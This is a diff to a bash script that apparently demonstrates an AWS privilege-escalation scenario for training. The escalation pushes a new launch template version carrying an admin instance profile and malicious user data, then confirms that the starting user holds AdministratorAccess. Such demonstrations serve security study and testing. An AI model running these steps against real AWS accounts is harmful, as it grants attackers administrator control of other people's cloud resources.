@@ -153,13 +153,13 @@ else
 fi
 echo ""
 
-# [EXPLOIT] Step 5: Inspect the existing launch template
+# [OBSERVATION] Step 5: Inspect the existing launch template
 echo -e "${YELLOW}Step 5: Inspecting the victim launch template${NC}"
-use_starting_creds
+use_readonly_creds
 echo "Target launch template: $VICTIM_TEMPLATE_NAME"
 echo ""
 
-show_cmd "Attacker" "aws ec2 describe-launch-templates --region "$AWS_REGION" --launch-template-names "$VICTIM_TEMPLATE_NAME" --query 'LaunchTemplates[0]' --output json"
+show_cmd "ReadOnly" "aws ec2 describe-launch-templates --region "$AWS_REGION" --launch-template-names "$VICTIM_TEMPLATE_NAME" --query 'LaunchTemplates[0]' --output json"
 TEMPLATE_INFO=$(aws ec2 describe-launch-templates \
     --region $AWS_REGION \
     --launch-template-names $VICTIM_TEMPLATE_NAME \
@@ -173,7 +173,7 @@ echo "Launch Template ID: $TEMPLATE_ID"
 echo "Current Default Version: $ORIGINAL_DEFAULT_VERSION"
 
 # Get current version details
-show_cmd "Attacker" "aws ec2 describe-launch-template-versions --region "$AWS_REGION" --launch-template-id "$TEMPLATE_ID" --versions '\$Default' --query 'LaunchTemplateVersions[0].LaunchTemplateData' --output json"
+show_cmd "ReadOnly" "aws ec2 describe-launch-template-versions --region "$AWS_REGION" --launch-template-id "$TEMPLATE_ID" --versions '\$Default' --query 'LaunchTemplateVersions[0].LaunchTemplateData' --output json"
 CURRENT_VERSION_INFO=$(aws ec2 describe-launch-template-versions \
     --region $AWS_REGION \
     --launch-template-id $TEMPLATE_ID \
@@ -216,7 +216,7 @@ echo -e "${GREEN}✓ Malicious user-data script prepared${NC}\n"
 
 # [EXPLOIT] Step 7: Create new launch template version with admin role and malicious user data
 echo -e "${YELLOW}Step 7: Creating new launch template version with admin role${NC}"
-use_starting_creds
+use_starting_creds  # switch back to attacker for the exploit steps
 echo "This is the privilege escalation vector - using CreateLaunchTemplateVersion..."
 echo "Instance profile: $TARGET_ADMIN_PROFILE"
 echo ""
@@ -372,13 +372,15 @@ if [ "$POLICY_ATTACHED" = false ]; then
     exit 1
 fi
 
-# [OBSERVATION] Step 12: Verify administrator access
+# [EXPLOIT] Step 12: Verify administrator access with starting user credentials
 echo -e "${YELLOW}Step 12: Verifying administrator access${NC}"
-use_readonly_creds
+echo "Waiting 15 seconds for IAM policy propagation..."
+sleep 15
+use_starting_creds
 echo "The starting user now has AdministratorAccess attached..."
-echo "Attempting to list IAM users..."
+echo "Attempting to list IAM users with starting user credentials..."
 
-show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
+show_cmd "Attacker (now admin)" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
